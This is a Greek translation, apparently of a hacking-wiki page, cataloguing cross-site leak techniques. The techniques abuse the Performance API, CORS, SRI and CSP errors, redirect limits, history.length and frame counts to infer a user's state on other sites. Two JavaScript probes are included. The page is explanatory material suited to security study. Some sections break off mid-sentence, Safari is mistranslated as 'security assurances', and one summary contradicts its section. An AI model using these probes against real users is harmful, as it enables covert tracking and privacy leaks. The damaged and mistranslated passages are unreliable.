Το [`API Απόδοσης`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει εισαγωγές σχετικά με τις μετρήσεις απόδοσης των web εφαρμογών, εμπλουτισμένες περαιτέρω από το [`API Χρονομέτρησης Πόρων`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Το API Χρονομέτρησης Πόρων επιτρέπει την παρακολούθηση λεπτομερών χρονομετρήσεων δικτυακών αιτημάτων, όπως η διάρκεια των αιτημάτων. Ειδικότερα, όταν οι διακομιστές περιλαμβάνουν τον κεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, διατίθενται επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης του τομέα.

Αυτή η πληθώρα δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως η [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή η [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια συνολική εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, το API διευκολύνει τη μέτρηση των χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ των χρονοσημάτων που λαμβάνονται από το [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε προγράμματα περιήγησης όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, πράγμα που μπορεί να επηρεάσει την ακρίβεια των μετρήσεων χρονομέτρησης.

Πέρα από τις μετρήσεις χρονομέτρησης, το API Απόδοσης μπορεί να αξιοποιηθεί για εισαγωγές που σχετίζονται με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδείξει την εφαρμογή των `X-Frame-Options`. Συγκεκριμένα, εάν μια σελίδα αποκλείεται από την απεικόνιση σε ένα πλαίσιο λόγω των `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας ένα διακριτικό ίχνος σχετικά με τις πολιτικές πλαισίωσης της σελίδας.

### Ανακατεύθυνση Έναρξης Διαρροή

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Η είσοδος χρονοδιαγράμματος διαρρέει την ώρα έναρξης μιας ανακατεύθυνσης.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μία περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων προγραμμάτων περιήγησης που καταγράφουν υπερβολικές πληροφορίες για αιτήσεις διασυνοριακής πρόσβασης. Το πρότυπο καθορίζει ένα υποσύνολο χαρακτηριστικών που πρέπει να οριστούν σε μηδέν για πόρους διασυνοριακής πρόσβασης. Ωστόσο, στο **SA** είναι δυνατό να ανιχνευθεί αν ο χρήστης ανακατευθύνθηκε από τη σελίδα στόχο, ερευνώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονοδιαγράμματος **redirectStart**.

### Διαρροή Διάρκειας Ανακατεύθυνσης

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Η διάρκεια των εισαγωγών χρονοδιαγράμματος είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήσεις που οδηγούν σε **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήσεις που δεν οδηγούν σε ανακατεύθυνση.

### Διαρροή CORP

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Οι πόροι που προστατεύονται με CORP δεν δημιουργούν εισαγωγές χρονοδιαγράμματος πόρων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η είσοδος **nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **κεφαλίδα CORP** ορίζεται, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου είσοδο απόδοσης για πόρους που υποστηρίζονται από CORP.

### Εργαζόμενος Υπηρεσίας

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Σύνοψη:** Ανίχνευση εάν ένας εργαζόμενος υπηρεσίας είναι εγγεγραμμένος για ένα συγκεκριμένο προέλευση.
* **Παράδειγμα Κώδικα**:

Οι εργαζόμενοι υπηρεσίας είναι περιβάλλοντα σεναρίων που λειτουργούν σε μια προέλευση. Τρέχουν στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **αποθηκεύουν πόρους** για τη δημιουργία εφαρμογών ιστού εκτός σύνδεσης.\
Εάν ένας **πόρος αποθηκεύεται** από έναν **εργαζόμενο υπηρεσίας** και προσπελαύνεται μέσω **iframe**, ο πόρος θα φορτωθεί από την **αποθήκη του εργαζόμενου υπηρεσίας**.\
Για να ανιχνευθεί εάν ο πόρος φορτώθηκε από την αποθήκη του εργαζόμενου υπηρεσίας, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση χρονισμού (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Αποθήκευση

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονοδιάγραμμα
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Σύνοψη:** Είναι δυνατό να ελεγχθεί εάν ένας πόρος έχει αποθηκευτεί στην μνήμη cache.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Χρησιμοποιώντας το [Performance API](./#performance-api) είναι δυνατό να ελεγχθεί αν ένας πόρος είναι αποθηκευμένος στην μνήμη cache.

### Διάρκεια Δικτύου

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Σύνοψη:** Είναι δυνατό να ανακτηθεί η διάρκεια του δικτύου μιας αίτησης από το `performance` API.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Τεχνική Μηνυμάτων Σφαλμάτων

### Σφάλμα Πολυμέσων

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML (Βίντεο, Ήχος)
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Σύνοψη:** Στο Firefox είναι δυνατό να διαρρεύσει ακριβώς ο κωδικός κατάστασης μιας αίτησης διασυνοριακής πρόσβασης.
* **Παράδειγμα Κώδικα**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)

```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```

### CORS Σφάλμα

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Σύνοψη:** Στις Διαβεβαιώσεις Ασφαλείας (SA), τα μηνύματα σφαλμάτων CORS αποκαλύπτουν αθέλητα τον πλήρη URL των ανακατευθυνθέντων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Αυτή η τεχνική επιτρέπει σε έναν επιτιθέμενο να **εξάγει τον προορισμό μιας ανακατεύθυνσης από ιστότοπο διαφορετικής προέλευσης** εκμεταλλευόμενο τον τρόπο με τον οποίο οι περιηγητές βασισμένοι σε Webkit χειρίζονται τα αιτήματα CORS. Συγκεκριμένα, όταν ένα **αίτημα ενεργοποιημένο για CORS** στέλνεται σε έναν ιστότοπο-στόχο που εκδίδει μια ανακατεύθυνση βασισμένη στην κατάσταση του χρήστη και ο περιηγητής αρνείται στη συνέχεια το αίτημα, το **πλήρες URL του προορισμού της ανακατεύθυνσης αποκαλύπτεται** μέσω του μηνύματος σφάλματος. Αυτή η ευπάθεια όχι μόνο αποκαλύπτει το γεγονός της ανακατεύθυνσης, αλλά αποκαλύπτει επίσης το σημείο προορισμού της ανακατεύθυνσης και οποιεσδήποτε **ευαίσθητες παράμετρους ερωτήματος** περιέχει.

### SRI Σφάλμα

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Σύνοψη:** Στις Διαβεβαιώσεις Ασφαλείας (SA), τα μηνύματα σφαλμάτων SRI αποκαλύπτουν αθέλητα τον πλήρη URL των ανακατευθυνθέντων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί τα **λεπτομερή μηνύματα σφάλματος** για να αποκαλύψει το μέγεθος των απαντήσεων από διαφορετική προέλευση. Αυτό είναι δυνατό λόγω του μηχανισμού της Ακεραιότητας Υποπόριστου Πόρου (SRI), ο οποίος χρησιμοποιεί το χαρακτηριστικό ακεραιότητας για να επικυρώσει ότι οι πόροι που ανακτώνται, συχνά από CDNs, δεν έχουν παραβιαστεί. Για να λειτουργήσει το SRI σε πόρους από διαφορετική προέλευση, πρέπει να είναι **ενεργοποιημένοι για CORS**· διαφορετικά, δεν υπόκεινται σε ελέγχους ακεραιότητας. Στις Διαβεβαιώσεις Ασφαλείας (SA), παρόμοια με το σφάλμα CORS XS-Leak, ένα μήνυμα σφάλματος μπορεί να καταγραφεί μετά από ένα αίτημα ανάκτησης που αποτυγχάνει με το χαρακτηριστικό ακεραιότητας. Οι επιτιθέμενοι μπορούν εσκεμμένα **να προκαλέσουν αυτό το σφάλμα** αναθέτοντας μια **ψεύτικη τιμή κατακερματισμού** στο χαρακτηριστικό ακεραιότητας οποιουδήποτε αιτήματος. Στις Διαβεβαιώσεις Ασφαλείας, το αποτέλεσμα του μηνύματος σφάλματος αποκαλύπτει αθέλητα το μήκος περιεχομένου του αιτούμενου πόρου. Αυτή η διαρροή πληροφοριών επιτρέπει σε έναν επιτιθέμενο να διακρίνει τις διακυμάνσεις στο μέγεθος της απάντησης, ανοίγοντας τον δρόμο για προηγμένες επιθέσεις XS-Leak.

### Παραβίαση/Ανίχνευση CSP

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Σύνοψη:** Εάν επιτρέπετε μόνο τον ιστότοπο των θυμάτων στο CSP και προσπαθήσει να ανακατευθύνει σε διαφορετικό το CSP θα ενεργοποιήσει ένα ανιχνεύσιμο σφάλμα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ένα XS-Leak μπορεί να χρησιμοποιήσει το CSP για να ανιχνεύσει αν ένας ιστότοπος διαφορετικής προέλευσης ανακατευθύνθηκε σε διαφορετική προέλευση. Αυτή η διαρροή μπορεί να ανιχνεύσει την ανακατεύθυνση, αλλά επιπλέον, διαρρέει τον τομέα του προορισμού της ανακατεύθυνσης. Η βασική ιδέα αυτής της επίθεσης είναι να **επιτρέψει τον τομέα στόχο στον ιστότοπο του επιτιθέμενου**. Μόλις αποσταλεί ένα αίτημα στον τομέα στόχο, **ανακατευθύνεται** σε έναν τομέα διαφορετικής προέλευσης. Το CSP αποκλείει την πρόσβαση σε αυτό και δημιουργεί ένα **αναφορά παραβίασης που χρησιμοποιείται ως τεχνική διαρροής**. Ανάλογα με τον περιηγητή, **αυτή η αναφορά μπορεί να διαρρεύσει την τοποθεσία του προορισμού της ανακατεύθυνσης**.\
Οι σύγχρονοι περιηγητές δεν θα υποδείξουν το URL στο οποίο ανακατευθύνθηκε, αλλά μπορείτε ακόμα να ανιχνεύσετε ότι προκλήθηκε μια ανακατεύθυνση διαφορετικής προέλευσης.

### Προσωρινή Αποθήκευση

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Σύνοψη:** Καθαρίστε το αρχείο από την προσωρινή μνήμη. Ανοίγει τη σελίδα-στόχο, ελέγχει αν το αρχείο υπάρχει στην προσωρινή μνήμη.
* **Παράδειγμα Κώδικα:**

Οι περιηγητές μπορεί να χρησιμοποιούν μια κοινή προσωρινή μνήμη για όλους τους ιστότοπους. Ανεξάρτητα από την προέλευσή τους, είναι δυνατό να εξαχθεί εάν μια σελίδα

### CORB

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Σύνοψη**: Το CORB μπορεί να επιτρέψει σε επιτιθέμενους να ανιχνεύσουν όταν η **επικεφαλίδα `nosniff` είναι παρούσα** στο αίτημα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Ελέγξτε τον σύνδεσμο για περισσότερες πληροφορίες σχετικά με την επίθεση.

### Σφάλμα CORS σε λανθάνουσα ρύθμιση Origin Reflection <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Σύνοψη**: Εάν η επικεφαλίδα Origin αντανακλάται στην επικεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελεγχθεί εάν ένας πόρος βρίσκεται ήδη στη μνήμη cache.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Σε περίπτωση που η **επικεφαλίδα Origin** αντανακλάται στην επικεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτήν τη συμπεριφορά για να προσπαθήσει να **ανακτήσει** τον **πόρο** σε λειτουργία **CORS**. Εάν δεν προκαλείται **σφάλμα**, σημαίνει ότι αυτός ανακτήθηκε **σωστά από τον ιστό**, ενώ εάν προκαλείται **σφάλμα**, σημαίνει ότι ανακτήθηκε από την **μνήμη cache** (το σφάλμα εμφανίζεται επειδή η μνήμη cache αποθηκεύει μια απόκριση με μια επικεφαλίδα CORS που επιτρέπει τον αρχικό τομέα και όχι τον τομέα του επιτιθέμενου).\
Να σημειωθεί ότι εάν η προέλευση δεν αντανακλάται αλλά χρησιμοποιείται ένας μπαλαντέρ (`Access-Control-Allow-Origin: *`), αυτό δεν θα λειτουργήσει.

## Τεχνική Αναγνώσιμων Χαρακτηριστικών

### Ανακατεύθυνση Fetch

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Σύνοψη:** Οι GC και SA επιτρέπουν τον έλεγχο του τύπου απάντησης (opaque-redirect) μετά την ολοκλήρωση της ανακατεύθυνσης.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας ένα αίτημα χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλες παραμέτρους, είναι δυνατό να διαβάσετε το χαρακτηριστικό `response.type` και εάν είναι ίσο με `opaqueredirect` τότε η απάντηση ήταν μια ανακατεύθυνση.

### COOP

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Σύνοψη:** Οι σελίδες που προστατεύονται από την πολιτική Cross-Origin Opener (COOP) εμποδίζουν την πρόσβαση από διασταυρούμενες αλληλεπιδράσεις.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ένας επιτιθέμενος είναι ικανός να συμπεράνει την παρουσία της επικεφαλίδας Cross-Origin Opener Policy (COOP) σε μια απόκριση HTTP διασταυρούμενης προέλευσης. Η COOP χρησιμοποιείται από τις web εφαρμογές για να εμποδίσουν εξωτερικές ιστοσελίδες από το να λάβουν αυθαίρετες αναφορές παραθύρων. Η ορατότητα αυτής της επικεφαλίδας μπορεί να διακριθεί με το να προσπαθήσετε να αποκτήσετε πρόσβαση στην αναφορά **`contentWindow`**. Σε περιπτώσεις όπου η COOP εφαρμόζεται συνθηκικά, η ιδιότητα **`opener`** γίνεται ένα ενδεικτικό στοιχείο: είναι **απροσδιόριστο** όταν η COOP είναι ενεργή και **ορισμένο** στην απουσία της.

### Μέγιστο Μήκος URL - Πλευρά Διακομιστή

* **Μέθοδοι Ενσωμάτωσης**: Fetch API, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης / Περιεχόμενο
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Σύνοψη:** Ανίχνευση διαφορών στις απαντήσεις λόγω του μεγέθους απάντησης ανακατεύθυνσης που ενδέχεται να είναι τόσο μεγάλο ώστε ο διακομιστής να απαντά με ένα σφάλμα και να δημιουργείται μια ειδοποίηση.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Εάν μια ανακατεύθυνση στην πλευρά του διακομιστή χρησιμοποιεί **είσοδο χρήστη μέσα στην ανακατεύθυνση** και **επιπλέον δεδομένα**. Είναι δυνατό να ανιχνευτεί αυτή η συμπεριφορά επειδή συνήθως οι **διακομιστές** έχουν ένα **όριο μήκους αιτήματος**. Εάν τα **δεδομένα χρήστη** είναι αυτό το **μήκος - 1**, επειδή η **ανακατεύθυνση** χρησιμοποιεί **αυτά τα δεδομένα** και **προσθέτει** κάτι **επιπλέον**, θα προκαλέσει ένα **σφάλμα που είναι ανιχνεύσιμο μέσω των Error Events**.

Εάν μπορείτε κάπως να ορίσετε cookies σε έναν χρήστη, μπορείτε επίσης να πραγματοποιήσετε αυτήν την επίθεση με το **να ορίσετε αρκετά cookies** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) έτσι με την **αύξηση του μεγέθους της απάντησης** της **σωστής απάντησης** θα προκληθεί ένα **σφάλμα**. Σε αυτήν την περίπτωση, να θυμάστε ότι εάν ενεργοποιήσετε αυτό το αίτημα από την ίδια τοποθεσία, το `<script>` θα στείλει αυτόματα τα cookies (έτσι μπορείτε να ελέγξετε για σφάλματα).\
Ένα παράδειγμα του **cookie bomb + XS-Search** μπορεί να βρεθεί στην Επιθυμητή λύση αυτού του άρθρου: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Το `SameSite=None` ή να βρίσκεστε στον ίδιο περιβάλλον είναι συνήθως απαραίτητο για αυτού του τύπου επίθεση.

### Μέγιστο Μήκος URL - Πλευρά Πελάτη

* \*\*Μέθο

### Μέγιστες Ανακατευθύνσεις

* **Μέθοδοι Ενσωμάτωσης**: Fetch API, Frames
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες Πληροφορίες**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Σύνοψη:** Χρησιμοποιήστε το όριο ανακατευθύνσεων του προγράμματος περιήγησης για να εξακριβώσετε την εμφάνιση ανακατευθύνσεων URL.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Εάν ο **μέγιστος** αριθμός **ανακατευθύνσεων** προς παρακολούθηση από ένα πρόγραμμα περιήγησης είναι **20**, ένας επιτιθέμενος θα μπορούσε να προσπαθήσει να φορτώσει τη σελίδα του με **19 ανακατευθύνσεις** και τελικά να **στείλει το θύμα** στη δοκιμαζόμενη σελίδα. Εάν προκληθεί ένα **σφάλμα**, τότε η σελίδα προσπαθούσε να **ανακατευθύνει το θύμα**.

### Μήκος Ιστορικού

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Ανακατευθύνσεις
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Σύνοψη:** Ο κώδικας JavaScript διαχειρίζεται το ιστορικό του προγράμματος περιήγησης και μπορεί να προσπελαστεί μέσω της ιδιότητας μήκους.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Η **Ιστορική API** επιτρέπει στον κώδικα JavaScript να διαχειρίζεται το ιστορικό του προγράμματος περιήγησης, το οποίο **αποθηκεύει τις σελίδες που έχει επισκεφθεί ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα μήκους ως μέθοδο ενσωμάτωσης: για να ανιχνεύσει την πλοήγηση JavaScript και HTML.\
**Έλεγχος του `history.length`**, κάνοντας έναν χρήστη να **πλοηγηθεί** σε μια σελίδα, να την **αλλάξει** πίσω στην ίδια προέλευση και να **ελέγξει** τη νέα τιμή του **`history.length`**.

### Μήκος Ιστορικού με το ίδιο URL

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Αν το URL είναι το ίδιο με αυτό που υποθέτουμε
* **Σύνοψη:** Είναι δυνατό να μαντέψουμε αν η τοποθεσία ενός πλαισίου/αναδυόμενου παραθύρου βρίσκεται σε ένα συγκεκριμένο URL καταχρώντας το μήκος του ιστορικού.
* **Παράδειγμα Κώδικα**: Παρακάτω

Ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει κώδικα JavaScript για να **διαχειριστεί την τοποθεσία του πλαισίου/αναδυόμενου παραθύρου σε ένα υποθετόμενο URL** και **άμεσα** να το **αλλάξει σε `about:blank`**. Εάν το μήκος του ιστορικού αυξηθεί, σημαίνει ότι το URL ήταν σωστό και είχε χρόνο να **αυξηθεί επειδή το URL δεν φορτώνεται εκ νέου αν είναι το ίδιο**. Αν δεν αυξηθεί, σημαίνει ότι **προσπάθησε να φορτώσει το υποθετόμενο URL** αλλά επειδή **άμεσα μετά** φορτώθηκε το **`about:blank`**, το **μήκος του ιστορικού δεν αυξήθηκε ποτέ** κατά τη φόρτωση του υποθετόμενου URL.

```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```

### Μέτρηση Κάδρων

* **Μέθοδοι Ενσωμάτωσης**: Κάδρα, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Σύνοψη:** Αξιολογήστε την ποσότητα των στοιχείων iframe ελέγχοντας την ιδιότητα `window.length`.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η **μέτρηση του αριθμού των καδρών** σε μια ιστοσελίδα που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στον προσδιορισμό της **κατάστασης του χρήστη σε αυτήν τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό καδρών, ο έλεγχος **συνεχώς** του αριθμού των καδρών μπορεί να βοηθήσει στον προσδιορισμό ενός **προτύπου** που μπορεί να διαρρεύσει πληροφορίες.

